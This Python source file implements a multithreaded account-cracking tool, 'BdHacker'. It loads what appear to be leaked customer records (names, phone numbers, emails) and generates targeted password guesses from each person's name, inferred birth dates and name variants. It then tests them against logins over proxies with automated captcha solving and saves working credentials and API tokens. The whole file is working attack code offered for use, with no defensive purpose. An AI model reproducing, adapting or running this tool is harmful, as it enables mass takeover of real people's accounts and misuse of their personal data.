import os
import threading
import time
import traceback
from threading import Lock
from passgen import PassGen
import colorama
from tools import Worker, solver
from config.config import *

bd_file = open(r'./config/TutuBusorders.csv', encoding='utf-8')
accounts = [i.replace('\n', '').split('\t') for i in bd_file.readlines()[1:] if i.strip()]
accounts_iterator = iter(accounts)
# first_name, last_name, phone, email

LOGIN_PASSWORD_SEPARATOR = ':'  # login:password = ':'; login@password = "@" ect.
accounts = "./config/list.txt"  # file with accounts to check
name_syn_file = "config/syn.out.txt"  # file with accounts to check
valid_accounts = "./out/valid_bd.list.txt"  # where to write valid accounts
invalid_logins = "./out/invalid_bd.list.txt"  # where to write invalid accounts
threads = 130  # count of threads. If you have good internet connection, you can increase it

proxies_fname = "./config/proxies.txt"  # you may leave file empty
Worker.ProxyType = 'http://'  # your proxy type. If u wana use socks - https://stackoverflow.com/questions/12601316/how-to-make-python-requests-work-via-socks-proxy


checked_accounts = set()
if os.path.exists(invalid_logins):
    with open(invalid_logins, encoding='utf-8') as file:
        checked_accounts = set(line.replace('\n', '').replace('\r', '') for line in file)
if os.path.exists(valid_accounts):
    with open(valid_accounts, encoding='utf-8') as file:
        for line in file:
            checked_accounts.add(line.split(LOGIN_PASSWORD_SEPARATOR)[0])
with open(proxies_fname, encoding='utf-8') as file:
    Worker.Proxies = [i.replace('\n', '').replace('\r', '') for i in file]
with open(name_syn_file, encoding='utf-8') as file:
    synonyms = (i.replace('\n','').replace('\r','').split(' ') for i in file)
    synonyms = [i for i in synonyms if i]

class BdHacker(Worker):
    SUCCESS_ACCOUNTS = 0
    RequestsLock = Lock()
    WRITE_CHECK_LOCK = Lock()
    ValidAccounts = 0
    ValidAccountsNo2FA = 0
    NextPasswd = []
    def _work(self):
        while 1:
            with Worker.Lock:
                if not self.Working: break
            self.one_hack_step()

    def _next_login_password(self):
        with self.RequestsLock:
            while not BdHacker.NextPasswd:
                self._create_pswd()
            return BdHacker.NextPasswd.pop()
    def _invalid_pswd(self, login, password):
        with self.RequestsLock:
            if self.NextPasswd and login not in self.NextPasswd[-1] and login not in checked_accounts:
                with open(invalid_logins, 'a', encoding="utf-8") as found_pswd_file:
                    found_pswd_file.write(login)
                    found_pswd_file.write('\n')
                checked_accounts.add(login)
    def _on_pswd_found(self, login, password, api, need_2fa):
        if need_2fa: self._invalid_pswd(login, password)
        else:
            with self.RequestsLock:
                with open(valid_accounts, 'a', encoding='utf-8') as f:
                    f.write(login)
                    f.write(LOGIN_PASSWORD_SEPARATOR)
                    f.write(password)
                    if need_2fa:
                        f.write(f"{LOGIN_PASSWORD_SEPARATOR}2fa")
                    else:
                        f.write(LOGIN_PASSWORD_SEPARATOR)
                        f.write(api.token)
                    f.write('\n')
            with Worker.Lock:
                BdHacker.SUCCESS_ACCOUNTS += 1

            with Worker.Lock:
                BdHacker.ValidAccounts += 1
                if not need_2fa: BdHacker.ValidAccountsNo2FA += 1
            with self.RequestsLock:
                BdHacker.NextPasswd = list(
                    filter(lambda i: i[0] != login, BdHacker.NextPasswd))
    INVALID_PHONES = [str(i)*5 for i in range(0, 10)]
    def _create_pswd(self):
        try:
            while 1:
                first_name, last_name, phone, email = next(accounts_iterator)
                phone = "".join(i for i in phone if i.isdigit())
                if phone.startswith("8"): phone = "7" + phone[1:]
                phone = "+" + phone
                if not phone.startswith("+79"): continue
                if phone in checked_accounts or email in checked_accounts: continue
                for i in self.INVALID_PHONES:
                    if i in phone:
                        break
                else: break
                with open(invalid_logins, 'a', encoding="utf-8") as found_pswd_file:
                    found_pswd_file.write(phone)
                    found_pswd_file.write('\n')
                    checked_accounts.add(phone)
        except Exception as e:
            with Worker.Lock:
                traceback.print_exc()
            return
        email = email.lower()
        p = PassGen(
            max_count=10,
            silent=True
        )
        numbers = "".join(i for i in email.split('@')[0] if i.isdigit())
        nick = "".join(i for i in email.split("@")[0] if not i.isdigit())
        if len(numbers) == 4:
            if 1935 < int(numbers) < 2013:
                yyyy = numbers
                mm = 1
                dd = 0
            else:
                if int(numbers[:2]) <= 31 and int(numbers[2:]) <= 31:
                    mm = numbers[:2]
                    dd = numbers[:2]
                else: mm, dd = 0, 0
                yyyy = 0
            yyyy1, mm1, dd1 = 0, 0, 0
        elif len(numbers) == 6:
            yyyy1, mm1, dd1 = numbers[:2], numbers[2:4], numbers[4:]
            mm, dd, yyyy = numbers[:2], numbers[2:4], numbers[4:]
            if int(yyyy) < 10 : yyyy = int(yyyy) + 2000
            else: yyyy = int(yyyy) + 1900
        elif len(numbers) == 8:
            yyyy, mm, dd = numbers[:4], numbers[4:6], numbers[6:]
            yyyy1, mm1, dd1 = numbers[4:], numbers[:2], numbers[2:4]
        else:
            yyyy, mm, dd, yyyy1, mm1, dd1  = 0, 0, 0, 0, 0, 0
        if int(mm) >= 12: mm, dd = dd, mm
        if int(mm1) >= 12: mm1, dd1 = dd1, mm1
        bdate = {'day': dd, 'month': mm, 'year': int(yyyy)} if yyyy != 0 and mm != 0 else ""
        bdate1 = {'day': dd1, 'month': mm1, 'year': int(yyyy1)} if yyyy1 != 0 and mm1 != 0  else ""

        p.target = {"firstname": first_name, "lastname": last_name, "nickname": nick, 'birthday': bdate}

        first_names = self._get_synonyms(first_name)
        last_names = self._get_synonyms(last_name)
        p.spouse = {"firstname": first_names[0] if first_names else "", "lastname": last_names[0] if last_names else last_name, "nickname": "", 'birthday': bdate1 if bdate1 else bdate}
        p.child = {"firstname": first_names[1] if len(first_names)>1 else first_name, "lastname": last_name[1] if len(last_names)>1 else last_name, "nickname": "", 'birthday': bdate}

        if len(first_names) > 2: p.pet = {"firstname": first_names[2], "lastname": last_name, "nickname": "", 'birthday': bdate}
        else: p.pet = {"firstname": "", "lastname": "", "nickname": "", "birthday": ""}
        p.generator(ignore_additional=True, write=False)
        for password in reversed(p.passwords_not_sorted):
            if f"{phone}{LOGIN_PASSWORD_SEPARATOR}{password}" not in checked_accounts:
                self.NextPasswd.append((phone, password))
                self.NextPasswd.append((email, password))

    @staticmethod
    def _get_synonyms(first_name):
        from tools_api.localization import translate
        tr = translate(first_name)
        for i in synonyms:
            if first_name in i or tr in i:
                i = i[::]
                if tr not in i: i.append(tr)
                if first_name in i:
                    i.remove(first_name)

                return i
        return [tr] if first_name != tr else []


def status_thread():
    print(f"Starting check attack for {colorama.Fore.CYAN}{len(accounts)}{colorama.Fore.RESET} accounts")
    while 1:
        with Worker.Lock:
            if not Worker.Working: break
        time.sleep(5)
        with Worker.Lock:
            print(
                f"Captcha Progress: {colorama.Fore.GREEN}{str(solver.TOTAL_COUNT-solver.FAIL_COUNT).ljust(9, ' ')}{colorama.Fore.RESET} success,",
                f"{colorama.Fore.RED}{str(solver.FAIL_COUNT).ljust(9, ' ')}{colorama.Fore.RESET} fail =",
                colorama.Fore.CYAN +
                f"{1 - solver.FAIL_COUNT / (solver.TOTAL_COUNT or 1):.2%}".ljust(7, ' '), 'correct',
                colorama.Fore.RESET,
                f"{(1 / (solver.argv_solve_time or 1)):,.2f} captcha per second"
            )


threads = [BdHacker(i) for i in range(threads)]

for i in threads:
    i.start()
threading.Thread(target=status_thread).start()
try:
    for i in threads:
        i.join()
finally:
    with Worker.Lock:
        Worker.Working = False
